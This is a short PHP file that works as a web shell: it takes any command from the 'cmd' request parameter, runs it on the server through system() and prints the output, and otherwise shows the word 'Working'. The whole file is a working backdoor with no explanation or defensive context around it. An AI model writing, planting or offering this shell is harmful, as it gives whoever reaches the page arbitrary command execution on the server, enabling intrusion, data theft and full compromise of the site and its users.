<?php 
if (isset($_REQUEST['cmd'])){
  $cmd = $_REQUEST['cmd'];
  echo "<p>";
  system($cmd);
  echo "</p>";
}
else {
  echo "Working";
}

?>
